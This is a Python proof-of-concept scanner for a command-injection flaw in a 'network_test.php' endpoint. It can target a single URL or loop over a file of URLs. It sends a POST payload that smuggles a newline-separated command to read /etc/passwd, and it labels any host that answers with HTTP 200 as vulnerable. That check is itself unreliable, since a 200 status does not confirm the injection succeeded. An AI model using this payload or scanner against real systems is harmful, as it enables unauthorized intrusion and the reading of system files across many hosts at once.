import sys
import requests
import argparse

def poc_scan(url):
    try:
        url = url + "/network_test.php"
        response = requests.post(url,data = "host=%0acat${IFS}/etc/passwd%0a&command=ping",timeout=2)
        if response.status_code == 200:
            print(f"\033[92m[+] {url} is vulnerable!\033[0m")
        else:
            print(f"\033[31m[-] {url} is not vulnerable!\033[0m")
    except:
        pass


def open_file(filename):
    with open(filename, 'r', encoding='utf-8') as f:
        filecontent = f.read()
    return filecontent

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url")
    parser.add_argument("-f", "--file")
    args = parser.parse_args()
    url = args.url
    filename = args.file

    if sys.argv[1] == '-u':
        poc_scan(url)
    else:
        filecontent = open_file(filename)
        filecontent = filecontent.split("\n")
        for i in filecontent:
            poc_scan(i)